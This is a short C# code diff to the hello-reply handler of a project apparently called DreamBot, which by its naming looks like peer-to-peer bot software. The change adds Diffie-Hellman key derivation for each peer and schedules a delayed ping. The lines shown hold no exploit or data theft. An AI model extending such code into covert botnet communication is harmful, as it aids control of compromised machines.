@@ -1,6 +1,9 @@
+using System;
+using DreamBot.Crypto;
 using DreamBot.Network.Protocol.Messages;
 using DreamBot.Network.Protocol.Messages.System;
 using DreamBot.Network.Protocol.Peers;
+using DreamBot.Workers;
 
 namespace DreamBot.Network.Protocol.Handlers
 {
@@ -19,6 +22,12 @@ namespace DreamBot.Network.Protocol.Handlers
         {
             var msg = botMessage.Message as HelloReplyMessage;
             var endpoint = botMessage.Header.EndPoint;
+
+            var peerInfo = _peerList[botMessage.Header.BotId];
+            peerInfo.EncryptionKey = DHKeyExchange.CalculateSharedKey(msg.PublicKey, BotIdentifier.PrivateKey);
+
+            ClientWorker.Instance.QueueOneTime(() =>
+                _messageManager.Send(new PingMessage(), botMessage.Header.BotId), TimeSpan.FromMinutes(1));
 
             //_peerList.TryRegister(new PeerInfo(botMessage.Header.BotId, endpoint)))
             //_versionManager.CheckBotVersion(msg.BotVersion, msg.Header.BotId, endpoint);
